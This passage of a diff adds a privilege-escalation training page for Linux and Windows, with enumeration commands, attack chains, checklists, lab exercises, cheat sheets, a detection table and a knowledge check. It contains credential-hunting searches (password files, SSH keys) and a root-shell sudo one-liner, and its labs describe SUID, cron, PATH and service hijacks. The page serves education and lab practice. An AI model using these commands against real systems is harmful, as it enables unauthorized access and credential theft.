+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use <code>Get-*</code> cmdlets and <code>Where-Object</code> to filter.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Whenever you have PowerShell access — it's usually faster than CMD.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">Get-Process</span>
+<span class="cmd">Get-Service</span>
+<span class="cmd">Get-LocalUser</span>
+<span class="cmd">Get-LocalGroup</span>
+<span class="cmd">Get-NetTCPConnection</span>
+<span class="cmd">Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "pass|cred|secret" }</span></pre>
+      </div>
+
+      <div class="callout warn">
+        <strong>PowerShell 7 note:</strong> <code>Get-WmiObject</code> and other WMI v1 cmdlets are removed in PowerShell 7+. Use <code>Get-CimInstance</code> instead.
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS TOOLS ==================== -->
+    <section class="section" id="win-tools">
+      <h2>🛠️ Windows Enumeration Tools</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Automated tools that check for common Windows PrivEsc indicators.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why useful</span>
+          <p>They surface misconfigurations quickly and consistently.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Run in a lab, review output, <strong>manually verify</strong> each finding.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>False positives. A tool's finding is a lead, not a conclusion.</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4>WinPEAS</h4>
+        <p>Automated enumeration. Highlights potential escalation paths. Verify manually.</p>
+      </div>
+      <div class="card">
+        <h4>PowerUp</h4>
+        <p>PowerShell script for common Windows privilege escalation checks.</p>
+      </div>
+      <div class="card">
+        <h4>Seatbelt</h4>
+        <p>Gathers system information, focuses on security configuration.</p>
+      </div>
+      <div class="card">
+        <h4>PrivescCheck</h4>
+        <p>Comprehensive PowerShell enumeration script.</p>
+      </div>
+    </section>
+
+    <!-- ==================== CHAINING ==================== -->
+    <section class="section" id="chaining">
+      <h2>🔗 Attack Path Chaining</h2>
+
+      <div class="section-intro">
+        <strong>Real privilege escalation is rarely a single finding.</strong> It's often a chain of small, low-severity findings that together cross the boundary. Learning to chain is what separates beginners from professionals.
+      </div>
+
+      <h3>Example Chain 1 — Linux</h3>
+      <div class="code-block">
+        <pre>Low Priv User
+      ↓
+Interesting Group (adm)
+      ↓
+Read System Logs (found credentials in log)
+      ↓
+Credential for another user
+      ↓
+Access Another Account (su)
+      ↓
+Sudo Permission (found in sudoers for that user)
+      ↓
+Root</pre>
+      </div>
+
+      <h3>Example Chain 2 — Linux</h3>
+      <div class="code-block">
+        <pre>User
+ ↓
+Writable Script (referenced by cron)
+ ↓
+Scheduled Task Executes as Root
+ ↓
+Modify Script to Drop SUID Binary
+ ↓
+SUID Bash Owned by Root
+ ↓
+Root</pre>
+      </div>
+
+      <h3>Example Chain 3 — Windows</h3>
+      <div class="code-block">
+        <pre>User
+ ↓
+Weak Service Permissions (service config writable)
+ ↓
+Redirect Service Binary Path
+ ↓
+Service Restarts as SYSTEM
+ ↓
+SYSTEM</pre>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Chaining mindset</div>
+        <p>Don't dismiss small findings. A credential in a log, a writable script, a misconfigured group — each alone may seem useless. Combined, they become a full chain.</p>
+      </div>
+    </section>
+
+    <!-- ==================== TECHNIQUE MATRIX ==================== -->
+    <section class="section" id="matrix">
+      <h2>📊 Technique Matrix</h2>
+      <p>Click a row to jump to the relevant technique. Reliability: 🟢 deterministic · 🟡 environment-dependent · 🔴 risky/unstable.</p>
+
+      <table>
+        <tr><th>Technique</th><th>OS</th><th>Enumeration</th><th>Requirement</th><th>Privileged Context</th><th>Reliability</th></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-sudo').scrollIntoView({behavior:'smooth'})"><td>Sudo Misconfig</td><td>Linux</td><td><code>sudo -l</code></td><td>Dangerous sudo rule</td><td>root</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-suid').scrollIntoView({behavior:'smooth'})"><td>SUID/SGID</td><td>Linux</td><td><code>find -perm -4000</code></td><td>Exploitable SUID binary</td><td>root</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-cron').scrollIntoView({behavior:'smooth'})"><td>Cron Jobs</td><td>Linux</td><td><code>cat /etc/crontab</code></td><td>Writable script or PATH</td><td>root</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-caps').scrollIntoView({behavior:'smooth'})"><td>Capabilities</td><td>Linux</td><td><code>getcap -r /</code></td><td>Dangerous capability</td><td>root</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-path').scrollIntoView({behavior:'smooth'})"><td>PATH Hijacking</td><td>Linux</td><td><code>echo $PATH</code></td><td>Writable earlier PATH dir</td><td>root</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('linux-kernel').scrollIntoView({behavior:'smooth'})"><td>Kernel Exploit</td><td>Linux</td><td><code>uname -a</code></td><td>Vulnerable kernel version</td><td>root</td><td>🟡</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-services').scrollIntoView({behavior:'smooth'})"><td>Service Misconfig</td><td>Windows</td><td><code>sc query</code>, <code>icacls</code></td><td>Weak service permissions</td><td>SYSTEM</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-unquoted').scrollIntoView({behavior:'smooth'})"><td>Unquoted Path</td><td>Windows</td><td><code>Get-CimInstance</code></td><td>Writable earlier path</td><td>SYSTEM</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-tokens').scrollIntoView({behavior:'smooth'})"><td>Token Privilege</td><td>Windows</td><td><code>whoami /priv</code></td><td>SeImpersonate etc.</td><td>SYSTEM</td><td>🟡</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-dll').scrollIntoView({behavior:'smooth'})"><td>DLL Hijacking</td><td>Windows</td><td>ProcMon</td><td>Writable search path</td><td>Privileged process</td><td>🟡</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-registry').scrollIntoView({behavior:'smooth'})"><td>Registry Misconfig</td><td>Windows</td><td><code>reg query</code></td><td>Writable privileged key</td><td>SYSTEM</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('win-pipes').scrollIntoView({behavior:'smooth'})"><td>Named Pipes</td><td>Windows</td><td>PipeList</td><td>Privileged pipe client</td><td>SYSTEM</td><td>🟡</td></tr>
+      </table>
+    </section>
+
+    <!-- ==================== LINUX CHECKLIST ==================== -->
+    <section class="section" id="linux-checklist">
+      <h2>✅ Linux PrivEsc Field Checklist</h2>
+      <p>Work through this top to bottom. Click items to save progress locally.</p>
+
+      <ul class="checklist">
+        <li><input type="checkbox"> <span><code>whoami</code> / <code>id</code> — current user, UID, GID</span></li>
+        <li><input type="checkbox"> <span><code>groups</code> — dangerous groups (docker, lxd, disk, adm, shadow)</span></li>
+        <li><input type="checkbox"> <span><code>sudo -l</code> — sudo rules, NOPASSWD, dangerous binaries</span></li>
+        <li><input type="checkbox"> <span><code>uname -a</code> / <code>/etc/os-release</code> — OS, kernel, architecture</span></li>
+        <li><input type="checkbox"> <span><code>env</code> — environment variables, PATH, secrets</span></li>
+        <li><input type="checkbox"> <span><code>echo $PATH</code> — writable dirs in PATH</span></li>
+        <li><input type="checkbox"> <span>SUID binaries — <code>find / -perm -4000 -type f 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>SGID binaries — <code>find / -perm -2000 -type f 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>Capabilities — <code>getcap -r / 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>Cron — <code>cat /etc/crontab</code>, <code>ls /etc/cron.*</code>, <code>crontab -l</code></span></li>
+        <li><input type="checkbox"> <span>Systemd timers — <code>systemctl list-timers --all</code></span></li>
+        <li><input type="checkbox"> <span>Systemd services — <code>systemctl list-units</code>, writable unit files</span></li>
+        <li><input type="checkbox"> <span>Running processes — <code>ps aux</code>, <code>ps -ef</code></span></li>
+        <li><input type="checkbox"> <span>Listening services — <code>ss -tulpn</code> (modern replacement for netstat)</span></li>
+        <li><input type="checkbox"> <span>Writable files — <code>find / -writable -type f 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>Writable dirs — <code>find / -writable -type d 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span><code>/etc/passwd</code> permissions — writable?</span></li>
+        <li><input type="checkbox"> <span><code>/etc/shadow</code> permissions — readable?</span></li>
+        <li><input type="checkbox"> <span>SSH config — <code>~/.ssh/</code>, <code>/etc/ssh/sshd_config</code></span></li>
+        <li><input type="checkbox"> <span>SSH keys — <code>find / -name "id_rsa" 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>History files — <code>~/.bash_history</code>, other shells</span></li>
+        <li><input type="checkbox"> <span>Config files — grep for password/secret/key</span></li>
+        <li><input type="checkbox"> <span>Backup files — <code>find / -name "*.bak" 2>/dev/null</code></span></li>
+        <li><input type="checkbox"> <span>Mounted filesystems — <code>mount</code>, <code>/etc/fstab</code></span></li>
+        <li><input type="checkbox"> <span>NFS — <code>showmount -e</code>, <code>/etc/exports</code></span></li>
+        <li><input type="checkbox"> <span>Docker — <code>groups</code>, <code>/var/run/docker.sock</code></span></li>
+        <li><input type="checkbox"> <span>LXC/LXD — <code>groups</code>, lxd/lxc binaries</span></li>
+        <li><input type="checkbox"> <span>ACLs — <code>getfacl</code> on interesting files</span></li>
+        <li><input type="checkbox"> <span>PAM — <code>ls -la /etc/pam.d/</code></span></li>
+        <li><input type="checkbox"> <span>Polkit — <code>pkexec --version</code></span></li>
+        <li><input type="checkbox"> <span>Network config — <code>ip a</code>, <code>ip route</code></span></li>
+        <li><input type="checkbox"> <span>Installed software — <code>dpkg -l</code>, <code>rpm -qa</code></span></li>
+        <li><input type="checkbox"> <span>Credentials / secrets in files</span></li>
+        <li><input type="checkbox"> <span>Kernel vulnerabilities — searchsploit</span></li>
+        <li><input type="checkbox"> <span>Automated enumeration — LinPEAS, LSE, pspy</span></li>
+        <li><input type="checkbox"> <span>Manual verification of each finding</span></li>
+      </ul>
+
+      <div class="callout success">
+        <strong>Tip:</strong> You don't need to run every item. But knowing what each one checks helps you decide what to skip.
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS CHECKLIST ==================== -->
+    <section class="section" id="win-checklist">
+      <h2>✅ Windows PrivEsc Field Checklist</h2>
+      <p>Work through this top to bottom. Click items to save progress locally.</p>
+
+      <ul class="checklist">
+        <li><input type="checkbox"> <span><code>whoami</code> — current user</span></li>
+        <li><input type="checkbox"> <span><code>whoami /priv</code> — dangerous privileges</span></li>
+        <li><input type="checkbox"> <span><code>whoami /groups</code> — group memberships</span></li>
+        <li><input type="checkbox"> <span><code>hostname</code></span></li>
+        <li><input type="checkbox"> <span><code>systeminfo</code> — OS, build, patch level</span></li>
+        <li><input type="checkbox"> <span>Architecture — x86 / x64 / ARM</span></li>
+        <li><input type="checkbox"> <span>Environment variables — <code>set</code></span></li>
+        <li><input type="checkbox"> <span>PATH — check for writable dirs</span></li>
+        <li><input type="checkbox"> <span>Running processes — <code>tasklist</code>, <code>Get-Process</code></span></li>
+        <li><input type="checkbox"> <span>Services — <code>sc query</code>, <code>Get-CimInstance Win32_Service</code></span></li>
+        <li><input type="checkbox"> <span>Service permissions — <code>accesschk</code>, <code>icacls</code></span></li>
+        <li><input type="checkbox"> <span>Service executable permissions</span></li>
+        <li><input type="checkbox"> <span>Unquoted service paths — <code>Get-CimInstance</code> filter</span></li>
+        <li><input type="checkbox"> <span>Scheduled tasks — <code>schtasks /query /fo LIST /v</code></span></li>
+        <li><input type="checkbox"> <span>Task permissions — writable executables</span></li>
+        <li><input type="checkbox"> <span>NTFS permissions — <code>icacls</code> on interesting files</span></li>
+        <li><input type="checkbox"> <span>ACLs — full DACL inspection</span></li>
+        <li><input type="checkbox"> <span>Registry permissions — <code>accesschk</code></span></li>
+        <li><input type="checkbox"> <span>AlwaysInstallElevated — <code>reg query</code></span></li>
+        <li><input type="checkbox"> <span>Stored credentials — <code>cmdkey /list</code></span></li>
+        <li><input type="checkbox"> <span>Unattended files — <code>unattend.xml</code>, <code>sysprep.inf</code></span></li>
+        <li><input type="checkbox"> <span>PowerShell history — <code>ConsoleHost_history.txt</code></span></li>
+        <li><input type="checkbox"> <span>Application configuration files</span></li>
+        <li><input type="checkbox"> <span>Installed software / versions</span></li>
+        <li><input type="checkbox"> <span>DLL search order — ProcMon</span></li>
+        <li><input type="checkbox"> <span>PATH hijacking opportunities</span></li>
+        <li><input type="checkbox"> <span>Dangerous privileges — SeImpersonate, SeBackup, etc.</span></li>
+        <li><input type="checkbox"> <span>Token-related issues — integrity levels</span></li>
+        <li><input type="checkbox"> <span>Named pipes — PipeList, <code>\\.\pipe\</code></span></li>
+        <li><input type="checkbox"> <span>Impersonation opportunities — services, pipes</span></li>
+        <li><input type="checkbox"> <span>Automated enumeration — WinPEAS, PowerUp, Seatbelt</span></li>
+        <li><input type="checkbox"> <span>Manual verification of each finding</span></li>
+      </ul>
+    </section>
+
+    <!-- ==================== COMPARISON ==================== -->
+    <section class="section" id="comparison">
+      <h2>📊 Linux vs Windows Privilege Escalation</h2>
+      <table>
+        <tr><th>Area</th><th>Linux</th><th>Windows</th></tr>
+        <tr><td>Privileged account</td><td>root</td><td>SYSTEM / Administrator</td></tr>
+        <tr><td>Permissions</td><td>Unix permissions + ACLs</td><td>NTFS ACLs</td></tr>
+        <tr><td>Services</td><td>systemd, init</td><td>Windows Services</td></tr>
+        <tr><td>Scheduled tasks</td><td>cron, systemd timers</td><td>Task Scheduler</td></tr>
+        <tr><td>Privilege model</td><td>sudo, capabilities</td><td>Tokens, privileges, UAC</td></tr>
+        <tr><td>Common enumeration</td><td>LinPEAS, LSE, pspy</td><td>WinPEAS, PowerUp, Seatbelt</td></tr>
+        <tr><td>Classic escalation</td><td>SUID, sudo, cron</td><td>Unquoted paths, weak services</td></tr>
+        <tr><td>Trust mechanism</td><td>Files, PATH, environment</td><td>Tokens, ACLs, registry</td></tr>
+        <tr><td>Advanced vectors</td><td>PAM, Polkit, D-Bus</td><td>Named pipes, impersonation</td></tr>
+      </table>
+    </section>
+
+    <!-- ==================== DECISION TREE ==================== -->
+    <section class="section" id="decision-tree">
+      <h2>🌳 Privilege Escalation Decision Tree</h2>
+
+      <h3>Linux</h3>
+      <div class="code-block">
+        <pre>Got low-priv shell
+    ↓
+Who am I? (id, whoami, groups)
+    ↓
+What can I sudo? (sudo -l)
+    ↓
+SUID/SGID binaries? (find -perm)
+    ↓
+Capabilities? (getcap)
+    ↓
+Cron jobs? (crontab, /etc/cron*, systemctl list-timers)
+    ↓
+Systemd services? (systemctl)
+    ↓
+Writable files/services?
+    ↓
+Kernel version? (uname -a)
+    ↓
+Credentials in files?
+    ↓
+Chain findings together
+    ↓
+Validate in lab → Document → Remediate</pre>
+      </div>
+
+      <h3>Windows</h3>
+      <div class="code-block">
+        <pre>Got low-priv shell
+    ↓
+Who am I? (whoami /priv)
+    ↓
+Services? (sc query, Get-CimInstance)
+    ↓
+Unquoted service paths?
+    ↓
+Scheduled tasks? (schtasks)
+    ↓
+Weak file permissions? (icacls)
+    ↓
+Registry misconfig? (AlwaysInstallElevated)
+    ↓
+Named pipes? (PipeList)
+    ↓
+Credentials? (cmdkey, files)
+    ↓
+Chain findings together
+    ↓
+Validate in lab → Document → Remediate</pre>
+      </div>
+    </section>
+
+    <!-- ==================== LABS ==================== -->
+    <section class="section" id="labs">
+      <h2>🧪 Practical Labs</h2>
+      <p>These labs are designed for <strong>your own VMs</strong>, CTF platforms, or intentionally vulnerable machines (e.g., TryHackMe, HackTheBox, VulnHub).</p>
+
+      <div class="accordion">
+        <div class="accordion-header">🐧 Linux Lab 1 — Basic Enumeration</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Identify current user, groups, OS, and basic system info.</p>
+          <p><strong>Commands:</strong> <code>id</code>, <code>uname -a</code>, <code>cat /etc/os-release</code>, <code>ip a</code>, <code>ss -tulpn</code>.</p>
+          <p><strong>What to look for:</strong> Unusual group memberships, old kernel, unexpected listening services.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🐧 Linux Lab 2 — Sudo Misconfiguration</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Find and safely exploit a sudo rule allowing a dangerous binary.</p>
+          <p><strong>Setup:</strong> In a lab VM, add <code>user ALL=(ALL) NOPASSWD: /usr/bin/find</code> to sudoers.</p>
+          <p><strong>Validation:</strong> Run <code>sudo find . -exec /bin/bash \; -quit</code> to spawn a root shell.</p>
+          <p><strong>Remediation:</strong> Remove unnecessary sudo rules, use absolute paths, restrict commands.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🐧 Linux Lab 3 — SUID PATH Hijack</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Identify a vulnerable SUID binary and exploit PATH injection.</p>
+          <p><strong>Setup:</strong> Create a SUID script that calls <code>cat</code> without full path.</p>
+          <p><strong>Validation:</strong> Place a malicious <code>cat</code> in /tmp, prepend /tmp to PATH, execute the SUID script.</p>
+          <p><strong>Root cause:</strong> Privileged process trusts PATH lookup.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🐧 Linux Lab 4 — Cron</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Exploit a writable cron script.</p>
+          <p><strong>Setup:</strong> Add a cron job running a script as root that is writable by your user.</p>
+          <p><strong>Validation:</strong> Modify the script to copy /bin/bash and set SUID, wait for cron, execute.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🪟 Windows Lab 1 — Basic Enumeration</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Gather user, group, privilege, and system information.</p>
+          <p><strong>Commands:</strong> <code>whoami /priv</code>, <code>systeminfo</code>, <code>net user</code>, <code>ipconfig</code>.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🪟 Windows Lab 2 — Unquoted Service Path</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Identify and exploit an unquoted service path.</p>
+          <p><strong>Setup:</strong> Create a service with a path like <code>C:\Program Files\Vuln Service\service.exe</code> (unquoted) and ensure <code>C:\Program.exe</code> is writable.</p>
+          <p><strong>Validation:</strong> Place a malicious executable at <code>C:\Program.exe</code>, restart service.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🪟 Windows Lab 3 — Weak Service Permissions</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Modify a service binary path via writable service configuration.</p>
+          <p><strong>Setup:</strong> Create a service whose registry key is writable by your user.</p>
+          <p><strong>Validation:</strong> Change the binary path to point to a malicious executable, restart service.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== TROUBLESHOOTING ==================== -->
+    <section class="section" id="troubleshooting">
+      <h2>🔧 Troubleshooting</h2>
+
+      <div class="section-intro">
+        <strong>When a technique doesn't work, don't guess.</strong> Walk through the checklist systematically. The reason is almost always one of: permissions, context, version, environment, or timing.
+      </div>
+
+      <h3>Universal Troubleshooting Flow</h3>
+      <div class="code-block">
+        <pre>Technique identified
+        ↓
+Didn't work
+        ↓
+Check permissions (can I actually modify the resource?)
+        ↓
+Check execution context (does it run as root/SYSTEM?)
+        ↓
+Check version (is the vulnerability present?)
+        ↓
+Check environment (PATH, ACLs, mitigations?)
+        ↓
+Check architecture (x86 vs x64?)
+        ↓
+Check timing (race? trigger? schedule?)
+        ↓
+Check mitigations (secure_path, ASLR, etc.)
+        ↓
+Find another path</pre>
+      </div>
+
+      <div class="card">
+        <h4>"My command returns nothing."</h4>
+        <p>Check if the command exists, if you have permission, and if the path is correct. Use <code>2>/dev/null</code> carefully — it can hide errors.</p>
+      </div>
+      <div class="card">
+        <h4>"The expected privilege is not available."</h4>
+        <p>Verify with <code>whoami /priv</code> or <code>sudo -l</code>. Sometimes UAC filtering removes privileges from your token.</p>
+      </div>
+      <div class="card">
+        <h4>"The service does not restart."</h4>
+        <p>You may need to reboot, or the service may have dependencies. Check service status and event logs.</p>
+      </div>
+      <div class="card">
+        <h4>"The file is writable but escalation does not work."</h4>
+        <p>Maybe the service doesn't run as SYSTEM, or the binary is not executed with the privileges you expect. Verify the execution context.</p>
+      </div>
+      <div class="card">
+        <h4>"The SUID binary exists but is not exploitable."</h4>
+        <p>Not all SUID binaries are vulnerable. It may drop privileges, use absolute paths, or not call external commands.</p>
+      </div>
+      <div class="card">
+        <h4>"PATH hijack didn't work with sudo."</h4>
+        <p>Sudo often enforces <code>secure_path</code>. Check <code>sudo -l</code> output and <code>/etc/sudoers</code> for <code>secure_path</code> and <code>env_reset</code>.</p>
+      </div>
+      <div class="card">
+        <h4>"The Windows privilege exists but the expected technique doesn't work."</h4>
+        <p>Privileges alone aren't enough. You need a compatible exploit and often a specific condition (a service to connect, a writable path, etc.). Check versions, AppContainer restrictions, and required APIs.</p>
+      </div>
+      <div class="card">
+        <h4>"wmic doesn't exist on my system."</h4>
+        <p>The <code>wmic</code> utility is deprecated and removed from newer Windows 11 builds. Use <code>Get-CimInstance</code> instead.</p>
+      </div>
+      <div class="card">
+        <h4>"ifconfig/netstat says command not found."</h4>
+        <p>Modern Linux distributions often don't include <code>net-tools</code> by default. Use <code>ip addr</code> instead of <code>ifconfig</code>, and <code>ss -tulpn</code> instead of <code>netstat</code>.</p>
+      </div>
+    </section>
+
+    <!-- ==================== FALSE POSITIVES ==================== -->
+    <section class="section" id="false-positives">
+      <h2>🚫 Common False Positives</h2>
+      <p>"Interesting" does not mean "exploitable."</p>
+      <ul>
+        <li><strong>SUID but not exploitable:</strong> Binary drops privileges or uses secure coding.</li>
+        <li><strong>Writable file but not useful:</strong> Not executed by a privileged process.</li>
+        <li><strong>Privilege present but restricted:</strong> Token has the privilege but policy prevents abuse.</li>
+        <li><strong>Service running as SYSTEM but not writable:</strong> No path to modify it.</li>
+        <li><strong>Credential found but expired/invalid:</strong> Always test credentials before relying on them.</li>
+        <li><strong>Vulnerable version but exploit incompatible:</strong> Check architecture, offsets, and prerequisites.</li>
+        <li><strong>Group membership without exploitable access:</strong> Being in a group does not guarantee a path.</li>
+      </ul>
+      <div class="callout">
+        <strong>Always manually verify.</strong> Automation highlights possibilities; you must confirm the root cause.
+      </div>
+    </section>
+
+    <!-- ==================== DETECTION ==================== -->
+    <section class="section" id="detection">
+      <h2>🛡️ Detection & Defense</h2>
+      <table>
+        <tr><th>Technique</th><th>Indicator</th><th>Detection</th><th>Mitigation</th></tr>
+        <tr><td>SUID abuse</td><td>Unexpected SUID binaries</td><td>File integrity monitoring</td><td>Remove unnecessary SUID bits</td></tr>
+        <tr><td>Sudo misconfig</td><td>Unusual sudo commands</td><td>Audit sudoers, log sudo usage</td><td>Least privilege, avoid NOPASSWD</td></tr>
+        <tr><td>Cron abuse</td><td>Modified cron scripts</td><td>Monitor cron directories</td><td>Secure permissions, avoid writable scripts</td></tr>
+        <tr><td>PATH hijack</td><td>Unusual command execution paths</td><td>Monitor process creation</td><td>Use absolute paths, secure_path</td></tr>
+        <tr><td>Unquoted service path</td><td>New executables in root paths</td><td>Monitor file creation in system dirs</td><td>Quote all service paths</td></tr>
+        <tr><td>Token theft</td><td>SeImpersonate abuse</td><td>Monitor process creation</td><td>Restrict privileges, patch</td></tr>
+        <tr><td>DLL hijack</td><td>DLL loaded from writable path</td><td>ProcMon, AppLocker</td><td>Secure DLL search order</td></tr>
+        <tr><td>Named pipes</td><td>Unusual pipe clients</td><td>Monitor pipe creation</td><td>Restrict pipe access</td></tr>
+      </table>
+    </section>
+
+    <!-- ==================== CHEAT SHEETS ==================== -->
+    <section class="section" id="cheatsheets">
+      <h2>📋 Command Cheat Sheets</h2>
+
+      <div class="tabs">
+        <button class="tab-btn active" data-tab="tab-linux">Linux</button>
+        <button class="tab-btn" data-tab="tab-cmd">Windows CMD</button>
+        <button class="tab-btn" data-tab="tab-ps">PowerShell</button>
+      </div>
+
+      <div class="tab-content active" id="tab-linux">
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">id</span>                                   <span class="comment"># User identity</span>
+<span class="cmd">sudo -l</span>                              <span class="comment"># Sudo permissions</span>
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>  <span class="comment"># SUID binaries</span>
+<span class="cmd">getcap -r / 2>/dev/null</span>              <span class="comment"># Capabilities</span>
+<span class="cmd">cat /etc/crontab</span>                     <span class="comment"># Cron jobs</span>
+<span class="cmd">systemctl list-timers --all</span>          <span class="comment"># Systemd timers (modern)</span>
+<span class="cmd">uname -a</span>                             <span class="comment"># Kernel version</span>
+<span class="cmd">getfacl /path</span>                        <span class="comment"># POSIX ACLs</span>
+<span class="cmd">ss -tulpn</span>                            <span class="comment"># Listening ports (modern netstat)</span>
+<span class="cmd">busctl list</span>                          <span class="comment"># D-Bus services</span></pre>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-cmd">
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">whoami /priv</span>                         <span class="comment"># Privileges</span>
+<span class="cmd">systeminfo</span>                           <span class="comment"># OS info</span>
+<span class="cmd">net user</span>                             <span class="comment"># Users</span>
+<span class="cmd">sc query state= all</span>                  <span class="comment"># Services</span>
+<span class="cmd">sc qc &lt;service&gt;</span>                      <span class="comment"># Service config</span>
+<span class="cmd">schtasks /query /fo LIST /v</span>          <span class="comment"># Scheduled tasks</span>
+<span class="cmd">icacls "C:\path"</span>                     <span class="comment"># Permissions</span>
+<span class="cmd">cmdkey /list</span>                         <span class="comment"># Stored credentials</span>
+<span class="cmd">Get-CimInstance Win32_Service</span>        <span class="comment"># Modern service enumeration</span></pre>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-ps">
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">Get-Process</span>
+<span class="cmd">Get-Service</span>
+<span class="cmd">Get-LocalUser</span>
+<span class="cmd">Get-NetTCPConnection</span>
+<span class="cmd">Get-ChildItem \\.\pipe\</span>
+<span class="cmd">Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' }</span>  <span class="comment"># Unquoted service paths</span>
+<span class="cmd">Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "pass|cred" }</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== KNOWLEDGE CHECK ==================== -->
+    <section class="section" id="knowledge-check">
+      <h2>❓ Final Knowledge Check</h2>
+
+      <div class="accordion">
+        <div class="accordion-header">1. What is the difference between vertical and horizontal privilege escalation?</div>
+        <div class="accordion-body">
+          <p><strong>Vertical:</strong> Gaining higher privileges (e.g., user → root/SYSTEM). <strong>Horizontal:</strong> Moving to another user with similar privileges.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">2. You have a low-privileged Linux shell. What are the first 10 things you would enumerate and why?</div>
+        <div class="accordion-body">
+          <p>1. <code>id</code> (who am I?) 2. <code>sudo -l</code> (what can I run?) 3. SUID binaries 4. Cron jobs 5. Running processes 6. Network ports 7. Kernel version 8. Writable files 9. Capabilities 10. Credentials in files.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">3. You find a Windows service running as SYSTEM. What would you check before considering it an escalation path?</div>
+        <div class="accordion-body">
+          <p>Check if the service binary or its directory is writable, if the path is unquoted, if the service configuration can be modified, and if the service restarts automatically.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">4. Why is automated enumeration not enough?</div>
+        <div class="accordion-body">
+          <p>Tools produce false positives. They highlight "interesting" findings but cannot prove exploitability. Manual verification is always required.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">5. Explain PATH hijacking in your own words — what, why, how?</div>
+        <div class="accordion-body">
+          <p><strong>What:</strong> Abusing the shell's PATH search order. <strong>Why:</strong> A privileged script calls a command without a full path, so the shell searches PATH. <strong>How:</strong> Insert a writable directory earlier in PATH and place a malicious command there. The privileged script executes your command as its user.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">6. You find a writable file. Is it automatically exploitable? Explain.</div>
+        <div class="accordion-body">
+          <p>No. It is <em>interesting</em>, not necessarily <em>exploitable</em>. You must verify: (1) a privileged process reads or executes it, (2) that process runs as root/SYSTEM, (3) you can write to it, (4) the process executes after your modification. Otherwise it's a false positive.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">7. Describe a realistic Linux PrivEsc chain using three findings.</div>
+        <div class="accordion-body">
+          <p>Example: (1) User is in the <code>adm</code> group → can read <code>/var/log/</code>. (2) Log contains a password for another user. (3) That user has a sudo rule for a dangerous binary → root.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">8. Why are reliability ratings useful in privilege escalation?</div>
+        <div class="accordion-body">
